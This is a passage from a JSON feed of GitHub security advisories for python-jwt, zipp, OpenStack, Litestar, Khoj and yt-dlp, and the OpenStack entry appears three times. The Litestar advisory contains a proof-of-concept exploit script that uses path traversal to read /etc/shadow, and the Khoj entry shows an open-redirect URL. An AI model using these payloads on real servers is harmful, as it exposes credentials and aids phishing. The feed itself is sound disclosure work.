            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An attacker who obtains a JWT can arbitrarily forge its contents without knowing the secret key. Depending on the application, this may for example enable the attacker to spoof other user's identities, hijack their sessions, or bypass authentication.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version 3.3.4\nFixed by: <a href=\"https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9\">https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None</p>\n<h3 id=\"references\">References</h3>\n<p>Found by <a href=\"Tom.Tervoort@secura.com\">Tom Tervoort</a>\n<a href=\"https://github.com/pypa/advisory-database/blob/main/vulns/python-jwt/PYSEC-2022-259.yaml\">https://github.com/pypa/advisory-database/blob/main/vulns/python-jwt/PYSEC-2022-259.yaml</a></p>\n<h3 id=\"more-information\">More information</h3>\n<p>The vulnerability allows an attacker, who possesses a single valid JWT, to create a new token with forged claims that the verify_jwt function will accept as valid.</p>\n<p>The issue is caused by an inconsistency between the JWT parsers used by python-jwt and its dependency jwcrypto. By mixing compact and JSON representations, an attacker can trick jwcrypto of parsing different claims than those over which a signature is validated by jwcrypto.</p>\n<p>Testing the fix has been added as an <a href=\"https://github.com/davedoesdev/python-jwt/blob/master/test/vulnerability_vows.py\">automated unit test</a> to python-jwt.</p>\n<p>If you have any questions or comments about this advisory, please open an issue in <a href=\"https://github.com/davedoesdev/python-jwt\">python-jwt</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/davedoesdev/python-jwt/security/advisories/GHSA-5p8v-58qm-c7fp\">https://github.com/davedoesdev/python-jwt/security/advisories/GHSA-5p8v-58qm-c7fp</a></li>\n<li><a href=\"https://github.com/davedoesdev/python-jwt/commit/6c5075469847b9e8b6e5336077d989d77a4d2bf1\">https://github.com/davedoesdev/python-jwt/commit/6c5075469847b9e8b6e5336077d989d77a4d2bf1</a></li>\n<li><a href=\"https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9\">https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-39227\">https://nvd.nist.gov/vuln/detail/CVE-2022-39227</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/blob/main/vulns/python-jwt/PYSEC-2022-259.yaml\">https://github.com/pypa/advisory-database/blob/main/vulns/python-jwt/PYSEC-2022-259.yaml</a></li>\n<li><a href=\"https://www.vicarius.io/vsociety/posts/authentication-bypass-in-python-jwt\">https://www.vicarius.io/vsociety/posts/authentication-bypass-in-python-jwt</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5p8v-58qm-c7fp\">https://github.com/advisories/GHSA-5p8v-58qm-c7fp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5p8v-58qm-c7fp",
            "title": "[python-jwt] python-jwt vulnerable to token forgery with new claims",
            "date_modified": "2024-07-10T21:32:15.000Z",
            "date_published": "2022-09-21T21:33:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5p8v-58qm-c7fp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A Denial of Service (DoS) vulnerability exists in the jaraco/zipp library, affecting all versions prior to 3.19.1. The vulnerability is triggered when processing a specially crafted zip file that leads to an infinite loop. This issue also impacts the zipfile module of CPython, as features from the third-party zipp library are later merged into CPython, and the affected code is identical in both projects. The infinite loop can be initiated through the use of functions affecting the <code>Path</code> module in both zipp and zipfile, such as <code>joinpath</code>, the overloaded division operator, and <code>iterdir</code>. Although the infinite loop is not resource exhaustive, it prevents the application from responding. The vulnerability was addressed in version 3.19.1 of jaraco/zipp.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-5569\">https://nvd.nist.gov/vuln/detail/CVE-2024-5569</a></li>\n<li><a href=\"https://github.com/jaraco/zipp/commit/fd604bd34f0343472521a36da1fbd22e793e14fd\">https://github.com/jaraco/zipp/commit/fd604bd34f0343472521a36da1fbd22e793e14fd</a></li>\n<li><a href=\"https://huntr.com/bounties/be898306-11f9-46b4-b28c-f4c4aa4ffbae\">https://huntr.com/bounties/be898306-11f9-46b4-b28c-f4c4aa4ffbae</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jfmj-5v4g-7637\">https://github.com/advisories/GHSA-jfmj-5v4g-7637</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jfmj-5v4g-7637",
            "title": "[zipp] zipp Denial of Service vulnerability",
            "date_modified": "2024-07-09T17:25:55.000Z",
            "date_published": "2024-07-09T00:31:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jfmj-5v4g-7637"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in OpenStack Cinder through 24.0.0, Glance before 28.0.2, and Nova before 29.0.3. Arbitrary file access can occur via custom QCOW2 external data. By supplying a crafted QCOW2 image that references a specific data file path, an authenticated user may convince systems to return a copy of that file's contents from the server, resulting in unauthorized access to potentially sensitive data. All Cinder and Nova deployments are affected; only Glance deployments with image conversion enabled are affected.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32498\">https://nvd.nist.gov/vuln/detail/CVE-2024-32498</a></li>\n<li><a href=\"https://launchpad.net/bugs/2059809\">https://launchpad.net/bugs/2059809</a></li>\n<li><a href=\"https://www.openwall.com/lists/oss-security/2024/07/02/2\">https://www.openwall.com/lists/oss-security/2024/07/02/2</a></li>\n<li><a href=\"https://github.com/openstack/cinder/commit/78f85c1f9b20a067ef64d6451dee0228c3a0db5e\">https://github.com/openstack/cinder/commit/78f85c1f9b20a067ef64d6451dee0228c3a0db5e</a></li>\n<li><a href=\"https://github.com/openstack/cinder/commit/d6a186945e03649343af55b46ed8dfe0dd326e40\">https://github.com/openstack/cinder/commit/d6a186945e03649343af55b46ed8dfe0dd326e40</a></li>\n<li><a href=\"https://github.com/openstack/glance/commit/22f0c9c6f98db1d93569e3edb800c271f35b0ef9\">https://github.com/openstack/glance/commit/22f0c9c6f98db1d93569e3edb800c271f35b0ef9</a></li>\n<li><a href=\"https://github.com/openstack/glance/commit/2e65391744a82421bc6f026ee8f1f3550038f175\">https://github.com/openstack/glance/commit/2e65391744a82421bc6f026ee8f1f3550038f175</a></li>\n<li><a href=\"https://github.com/openstack/glance/commit/867d1dd8b6e4f5774257a98c7c33061fbbbde973\">https://github.com/openstack/glance/commit/867d1dd8b6e4f5774257a98c7c33061fbbbde973</a></li>\n<li><a href=\"https://github.com/openstack/glance/commit/cc7d53adbecf85f3d7df78e7618fe8ab3a075c5f\">https://github.com/openstack/glance/commit/cc7d53adbecf85f3d7df78e7618fe8ab3a075c5f</a></li>\n<li><a href=\"https://github.com/openstack/glance/commit/d607e78630cc9d1ca18b3a027322809c042f64df\">https://github.com/openstack/glance/commit/d607e78630cc9d1ca18b3a027322809c042f64df</a></li>\n<li><a href=\"https://github.com/openstack/nova/commit/657e86585cc57f84ab9b364dd189547d231d5927\">https://github.com/openstack/nova/commit/657e86585cc57f84ab9b364dd189547d231d5927</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r4v4-w9pv-6fph\">https://github.com/advisories/GHSA-r4v4-w9pv-6fph</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r4v4-w9pv-6fph",
            "title": "[nova] OpenStack Cinder, Glance, and Nova vulnerable to arbitrary file access",
            "date_modified": "2024-07-08T19:04:08.000Z",
            "date_published": "2024-07-05T03:30:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r4v4-w9pv-6fph"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in OpenStack Cinder through 24.0.0, Glance before 28.0.2, and Nova before 29.0.3. Arbitrary file access can occur via custom QCOW2 external data. By supplying a crafted QCOW2 image that references a specific data file path, an authenticated user may convince systems to return a copy of that file's contents from the server, resulting in unauthorized access to potentially sensitive data. All Cinder and Nova deployments are affected; only Glance deployments with image conversion enabled are affected.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32498\">https://nvd.nist.gov/vuln/detail/CVE-2024-32498</a></li>\n<li><a href=\"https://launchpad.net/bugs/2059809\">https://launchpad.net/bugs/2059809</a></li>\n<li><a href=\"https://www.openwall.com/lists/oss-security/2024/07/02/2\">https://www.openwall.com/lists/oss-security/2024/07/02/2</a></li>\n<li><a href=\"https://github.com/openstack/cinder/commit/78f85c1f9b20a067ef64d6451dee0228c3a0db5e\">https://github.com/openstack/cinder/commit/78f85c1f9b20a067ef64d6451dee0228c3a0db5e</a></li>\n<li><a href=\"https://github.com/openstack/cinder/commit/d6a186945e03649343af55b46ed8dfe0dd326e40\">https://github.com/openstack/cinder/commit/d6a186945e03649343af55b46ed8dfe0dd326e40</a></li>\n<li><a href=\"https://github.com/openstack/glance/commit/22f0c9c6f98db1d93569e3edb800c271f35b0ef9\">https://github.com/openstack/glance/commit/22f0c9c6f98db1d93569e3edb800c271f35b0ef9</a></li>\n<li><a href=\"https://github.com/openstack/glance/commit/2e65391744a82421bc6f026ee8f1f3550038f175\">https://github.com/openstack/glance/commit/2e65391744a82421bc6f026ee8f1f3550038f175</a></li>\n<li><a href=\"https://github.com/openstack/glance/commit/867d1dd8b6e4f5774257a98c7c33061fbbbde973\">https://github.com/openstack/glance/commit/867d1dd8b6e4f5774257a98c7c33061fbbbde973</a></li>\n<li><a href=\"https://github.com/openstack/glance/commit/cc7d53adbecf85f3d7df78e7618fe8ab3a075c5f\">https://github.com/openstack/glance/commit/cc7d53adbecf85f3d7df78e7618fe8ab3a075c5f</a></li>\n<li><a href=\"https://github.com/openstack/glance/commit/d607e78630cc9d1ca18b3a027322809c042f64df\">https://github.com/openstack/glance/commit/d607e78630cc9d1ca18b3a027322809c042f64df</a></li>\n<li><a href=\"https://github.com/openstack/nova/commit/657e86585cc57f84ab9b364dd189547d231d5927\">https://github.com/openstack/nova/commit/657e86585cc57f84ab9b364dd189547d231d5927</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r4v4-w9pv-6fph\">https://github.com/advisories/GHSA-r4v4-w9pv-6fph</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r4v4-w9pv-6fph",
            "title": "[glance] OpenStack Cinder, Glance, and Nova vulnerable to arbitrary file access",
            "date_modified": "2024-07-08T19:04:08.000Z",
            "date_published": "2024-07-05T03:30:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r4v4-w9pv-6fph"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in OpenStack Cinder through 24.0.0, Glance before 28.0.2, and Nova before 29.0.3. Arbitrary file access can occur via custom QCOW2 external data. By supplying a crafted QCOW2 image that references a specific data file path, an authenticated user may convince systems to return a copy of that file's contents from the server, resulting in unauthorized access to potentially sensitive data. All Cinder and Nova deployments are affected; only Glance deployments with image conversion enabled are affected.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32498\">https://nvd.nist.gov/vuln/detail/CVE-2024-32498</a></li>\n<li><a href=\"https://launchpad.net/bugs/2059809\">https://launchpad.net/bugs/2059809</a></li>\n<li><a href=\"https://www.openwall.com/lists/oss-security/2024/07/02/2\">https://www.openwall.com/lists/oss-security/2024/07/02/2</a></li>\n<li><a href=\"https://github.com/openstack/cinder/commit/78f85c1f9b20a067ef64d6451dee0228c3a0db5e\">https://github.com/openstack/cinder/commit/78f85c1f9b20a067ef64d6451dee0228c3a0db5e</a></li>\n<li><a href=\"https://github.com/openstack/cinder/commit/d6a186945e03649343af55b46ed8dfe0dd326e40\">https://github.com/openstack/cinder/commit/d6a186945e03649343af55b46ed8dfe0dd326e40</a></li>\n<li><a href=\"https://github.com/openstack/glance/commit/22f0c9c6f98db1d93569e3edb800c271f35b0ef9\">https://github.com/openstack/glance/commit/22f0c9c6f98db1d93569e3edb800c271f35b0ef9</a></li>\n<li><a href=\"https://github.com/openstack/glance/commit/2e65391744a82421bc6f026ee8f1f3550038f175\">https://github.com/openstack/glance/commit/2e65391744a82421bc6f026ee8f1f3550038f175</a></li>\n<li><a href=\"https://github.com/openstack/glance/commit/867d1dd8b6e4f5774257a98c7c33061fbbbde973\">https://github.com/openstack/glance/commit/867d1dd8b6e4f5774257a98c7c33061fbbbde973</a></li>\n<li><a href=\"https://github.com/openstack/glance/commit/cc7d53adbecf85f3d7df78e7618fe8ab3a075c5f\">https://github.com/openstack/glance/commit/cc7d53adbecf85f3d7df78e7618fe8ab3a075c5f</a></li>\n<li><a href=\"https://github.com/openstack/glance/commit/d607e78630cc9d1ca18b3a027322809c042f64df\">https://github.com/openstack/glance/commit/d607e78630cc9d1ca18b3a027322809c042f64df</a></li>\n<li><a href=\"https://github.com/openstack/nova/commit/657e86585cc57f84ab9b364dd189547d231d5927\">https://github.com/openstack/nova/commit/657e86585cc57f84ab9b364dd189547d231d5927</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r4v4-w9pv-6fph\">https://github.com/advisories/GHSA-r4v4-w9pv-6fph</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r4v4-w9pv-6fph",
            "title": "[cinder] OpenStack Cinder, Glance, and Nova vulnerable to arbitrary file access",
            "date_modified": "2024-07-08T19:04:08.000Z",
            "date_published": "2024-07-05T03:30:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r4v4-w9pv-6fph"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"summary\">Summary</h1>\n<p><strong>Local File Inclusion via Path Traversal in LiteStar Static File Serving</strong></p>\n<p>A Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of <a href=\"https://github.com/litestar-org/litestar\">LiteStar</a>. This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.</p>\n<h2 id=\"details\">Details</h2>\n<p>The vulnerability is located in the file path handling mechanism within the static content serving function, specifically at <a href=\"https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70\">line 70 in <code>litestar/static_files/base.py</code></a>.</p>\n<p>The function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:</p>\n<pre><code class=\"language-python\">commonpath([str(directory), file_info[\"name\"], joined_path])\n</code></pre>\n<p>Given the variables:</p>\n<pre><code class=\"language-python\">directory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n</code></pre>\n<p>The function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.</p>\n<h2 id=\"proof-of-concept-poc\">Proof of Concept (PoC)</h2>\n<p>To reproduce this vulnerability, follow these steps:</p>\n<ol>\n<li><p><strong>Set up the environment:</strong></p>\n<ul>\n<li>Install with pip the <code>uvicorn</code> and <code>litestar</code> packages.</li>\n<li>Create a <code>static</code> folder in the root directory of your project and place any file (e.g., an image) in it for testing.</li>\n<li>Ensure the static file serving is enabled, which is typically the default configuration.</li>\n</ul>\n</li>\n<li><p><strong>Preparation of the testing environment:</strong></p>\n<ul>\n<li>If using Ubuntu or a similar system, you can use <code>/etc/shadow</code> which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.</li>\n<li>Create a <code>main.py</code> file with the following content to configure and run the LiteStar server:</li>\n</ul>\n<pre><code class=\"language-python\">from pathlib import Path\nfrom litestar import Litestar\nfrom litestar.static_files import create_static_files_router\nimport uvicorn\n\napp = Litestar(\n    route_handlers=[\n        create_static_files_router(path=\"/static\", directories=[\"static\"]),\n    ],\n)\n\nif __name__ == \"__main__\":\n    uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n</code></pre>\n<ul>\n<li>Run this script with the command <code>python3 main.py</code> to start the server.</li>\n</ul>\n</li>\n<li><p><strong>Exploit:</strong></p>\n<ul>\n<li>Prepare an exploit script named <code>exploit.py</code> with the following Python code to perform the HTTP request without client-side sanitization:</li>\n</ul>\n<pre><code class=\"language-python\">import http.client\n\ndef send_request(host, port, path):\n    connection = http.client.HTTPConnection(host, port)\n    connection.request(\"GET\", path)\n    response = connection.getresponse()\n    print(f\"Status: {response.status}\")\n    print(f\"Headers: {response.getheaders()}\")\n    data = response.read()\n    print(f\"Body: {data.decode('utf-8')}\")\n    connection.close()\n\nsend_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n</code></pre>\n<ul>\n<li>Execute this script using <code>python3 exploit.py</code>. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.</li>\n</ul>\n</li>\n<li><p><strong>Observe:</strong></p>\n<ul>\n<li>The server should respond with the contents of the <code>/etc/shadow</code> file, thereby confirming the path traversal vulnerability.</li>\n<li>The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"impact\">Impact</h2>\n<p>This Local File Inclusion vulnerability critically affects all instances of <a href=\"https://github.com/litestar-org/litestar\">LiteStar</a> where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:</p>\n<ol>\n<li><p><strong>Exposure of Sensitive Information:</strong></p>\n<ul>\n<li>The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.</li>\n</ul>\n</li>\n<li><p><strong>Potential for System Compromise:</strong></p>\n<ul>\n<li>If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a <code>.env</code> file might reveal environment variables used for application configurations that include database passwords or API keys.</li>\n</ul>\n</li>\n<li><p><strong>Credential Leakage:</strong></p>\n<ul>\n<li>Access to files such as <code>/etc/passwd</code> or <code>/etc/shadow</code> (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.</li>\n</ul>\n</li>\n<li><p><strong>Regulatory and Compliance Violations:</strong></p>\n<ul>\n<li>Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.</li>\n</ul>\n</li>\n<li><p><strong>Loss of Trust and Reputation Damage:</strong></p>\n<ul>\n<li>Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.</li>\n</ul>\n</li>\n<li><p><strong>Potential for Further Exploitation:</strong></p>\n<ul>\n<li>The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.</li>\n</ul>\n</li>\n</ol>\n<p>Here's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:</p>\n<h2 id=\"mitigation-suggestion\">Mitigation Suggestion</h2>\n<p>To effectively address the Local File Inclusion vulnerability via path traversal identified in the <a href=\"https://github.com/litestar-org/litestar\">LiteStar</a> application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:</p>\n<ol>\n<li><p><strong>Input Validation and Sanitization:</strong></p>\n<ul>\n<li>Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as <code>../</code> which are used in path traversal attacks.</li>\n<li>Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.</li>\n</ul>\n</li>\n<li><p><strong>Path Normalization:</strong></p>\n<ul>\n<li>Normalize file paths before using them in file operations. Functions such as <code>os.path.normpath()</code> in Python can be used to normalize paths. This method resolves redundant separators and up-level references (<code>../</code>) to prevent directory traversal.</li>\n<li>As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:<pre><code class=\"language-python\">if os.path.commonpath([full_path, directory]) != directory:\n    # Don't allow misbehaving clients to break out of the static files\n    # directory.\n    continue\n</code></pre>\nThis snippet from <a href=\"https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166\">Starlette's implementation</a> ensures that the constructed file path does not traverse out of the specified directory.</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"comments\">Comments</h2>\n<p><strong>Naming Convention:</strong></p>\n<ul>\n<li>From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"</li>\n<li>Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"</li>\n</ul>\n<p><strong>Feature Additions and Changes:</strong></p>\n<ul>\n<li>Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.</li>\n<li>Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/litestar-org/litestar/security/advisories/GHSA-83pv-qr33-2vcf\">https://github.com/litestar-org/litestar/security/advisories/GHSA-83pv-qr33-2vcf</a></li>\n<li><a href=\"https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70\">https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32982\">https://nvd.nist.gov/vuln/detail/CVE-2024-32982</a></li>\n<li><a href=\"https://github.com/litestar-org/litestar/commit/57e706e7effdc182fc9a2af5981bc88afb21851b\">https://github.com/litestar-org/litestar/commit/57e706e7effdc182fc9a2af5981bc88afb21851b</a></li>\n<li><a href=\"https://github.com/litestar-org/litestar/commit/a07b79b84d8717bec5ac4d4674c1e4920ba9c813\">https://github.com/litestar-org/litestar/commit/a07b79b84d8717bec5ac4d4674c1e4920ba9c813</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-83pv-qr33-2vcf\">https://github.com/advisories/GHSA-83pv-qr33-2vcf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-83pv-qr33-2vcf",
            "title": "[starlite] Litestar and Starlite vulnerable to Path Traversal",
            "date_modified": "2024-07-08T18:47:29.000Z",
            "date_published": "2024-05-06T14:20:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-83pv-qr33-2vcf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An attacker can use the <code>next</code> parameter on the login page to redirect a victim to a malicious page, while masking this using a legit-looking <code>app.khoj.dev</code> url.\nFor example, <code>https://app.khoj.dev/login?next=//example.com</code> will redirect to the <a href=\"https://example.com\">https://example.com</a> page.</p>\n<h3 id=\"details\">Details</h3>\n<p>The problem seems to be in this method: <a href=\"https://github.com/khoj-ai/khoj/blob/2667ef45449eb408ce1d7c393be04845be31e15f/src/khoj/routers/auth.py#L95\">https://github.com/khoj-ai/khoj/blob/2667ef45449eb408ce1d7c393be04845be31e15f/src/khoj/routers/auth.py#L95</a></p>\n<h3 id=\"poc\">PoC</h3>\n<p>Open the <code>https://app.khoj.dev/login?next=//example.com</code> url in a Gecko-based browser (Firefox).</p>\n<h3 id=\"impact\">Impact</h3>\n<p>The impact is low, and this could only be used in phishing attempts, but it's still a problem nonetheless.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/khoj-ai/khoj/security/advisories/GHSA-564j-v29w-rqr6\">https://github.com/khoj-ai/khoj/security/advisories/GHSA-564j-v29w-rqr6</a></li>\n<li><a href=\"https://github.com/khoj-ai/khoj/commit/4daf16e5f916641304e11d56a6071ad365c21a18\">https://github.com/khoj-ai/khoj/commit/4daf16e5f916641304e11d56a6071ad365c21a18</a></li>\n<li><a href=\"https://github.com/khoj-ai/khoj/blob/2667ef45449eb408ce1d7c393be04845be31e15f/src/khoj/routers/auth.py#L95\">https://github.com/khoj-ai/khoj/blob/2667ef45449eb408ce1d7c393be04845be31e15f/src/khoj/routers/auth.py#L95</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-564j-v29w-rqr6\">https://github.com/advisories/GHSA-564j-v29w-rqr6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-564j-v29w-rqr6",
            "title": "[khoj-assistant] Khoj Open Redirect Vulnerability in Login Page",
            "date_modified": "2024-07-08T14:57:43.000Z",
            "date_published": "2024-07-08T14:57:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-564j-v29w-rqr6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>yt-dlp's DouyuTV and DouyuShow extractors used a <code>cdn.bootcdn.net</code> URL as a fallback for fetching a component of the crypto-js JavaScript library. When the Douyu extractor is used, yt-dlp extracts this JavaScript code and attempts to execute it externally using <a href=\"https://github.com/ariya/phantomjs\">PhantomJS</a>. <code>bootcdn.net</code> is owned by the bad actor responsible for the <a href=\"https://sansec.io/research/polyfill-supply-chain-attack\">Polyfill JS supply chain attack</a> that has been ongoing since at least June 2023. While there is no evidence that PhantomJS has been targeted by or is vulnerable to any attacks carried out by the Polyfill JS actor, there is the possibility that malicious JavaScript code may have been downloaded/cached by yt-dlp or executed by PhantomJS.</p>\n<p>In order for this potential vulnerability to be exploited by any hypothetical attack, all 3 of the following conditions must be met:</p>\n<ol>\n<li>The user has PhantomJS installed on their system.</li>\n<li>The user passes a <code>douyu.com</code> or <code>douyutv.com</code> URL to yt-dlp as input, or passes a URL that redirects to one of these domains.</li>\n<li><code>cdnjs.cloudflare.com</code> is unavailable or blocked at the time of extraction, necessitating the usage of the <code>cdn.bootcdn.net</code> fallback; or it had been unavailable during a previous run of the Douyu extractor and JavaScript code from <code>cdn.bootcdn.net</code> had been cached to disk.</li>\n</ol>\n<h3 id=\"patches\">Patches</h3>\n<p>yt-dlp version 2024.07.07 fixes this issue by removing the URL pointing to the malicious CDN and by invalidating any Douyu extractor cache data created by unpatched versions of yt-dlp.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>It is recommended to upgrade yt-dlp to version 2024.07.07 as soon as possible.</p>\n<p>For users not able to upgrade:</p>\n<ul>\n<li>Avoid using the Douyu extractors (<code>--ies default,-douyutv,-douyushow</code>)</li>\n<li>Uninstall (or do not install) PhantomJS</li>\n</ul>\n<h3 id=\"acknowledgement\">Acknowledgement</h3>\n<p>Thanks to @LeSuisse for <a href=\"https://github.com/yt-dlp/yt-dlp/pull/10347\">reporting this</a> promptly after <code>bootcdn.net</code> was discovered to be under control of the same bad actor behind the <code>polyfill.io</code> supply chain attack.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/yt-dlp/yt-dlp/commit/6075a029dba70a89675ae1250e7cdfd91f0eba41\">https://github.com/yt-dlp/yt-dlp/commit/6075a029dba70a89675ae1250e7cdfd91f0eba41</a></li>\n<li><a href=\"https://sansec.io/research/polyfill-supply-chain-attack\">https://sansec.io/research/polyfill-supply-chain-attack</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-3v33-3wmw-3785\">https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-3v33-3wmw-3785</a></li>\n<li><a href=\"https://github.com/yt-dlp/yt-dlp/commit/6075a029dba70a89675ae1250e7cdfd91f0eba41\">https://github.com/yt-dlp/yt-dlp/commit/6075a029dba70a89675ae1250e7cdfd91f0eba41</a></li>\n<li><a href=\"https://sansec.io/research/polyfill-supply-chain-attack\">https://sansec.io/research/polyfill-supply-chain-attack</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3v33-3wmw-3785\">https://github.com/advisories/GHSA-3v33-3wmw-3785</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3v33-3wmw-3785",
            "title": "[yt-dlp] yt-dlp has dependency on potentially malicious third-party code in Douyu extractors",
            "date_modified": "2024-07-08T14:22:02.000Z",
            "date_published": "2024-07-08T14:22:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3v33-3wmw-3785"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}